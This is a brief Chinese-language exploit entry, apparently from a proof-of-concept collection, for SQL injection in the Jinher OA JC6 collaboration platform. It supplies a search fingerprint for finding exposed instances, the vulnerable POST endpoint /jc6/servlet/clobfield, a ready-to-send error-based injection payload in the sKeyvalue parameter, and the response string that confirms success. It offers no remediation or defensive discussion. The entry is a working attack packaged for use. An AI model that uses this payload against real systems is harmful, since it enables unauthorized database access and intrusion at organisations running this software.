# 金和OAjc6SQL注入

金和OA ｜ SQL注入 ｜ —
- **指纹**：`title="金和协同管理平台"`
- **请求**：`POST /jc6/servlet/clobfield HTTP/1.1`

**Payload**
```
key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1' and 1=convert(int,(select sys.fn_sqlvarbasetostr(HashBytes('MD5','12345'))))--+
```
- **响应特征**：200 e5b086206e766172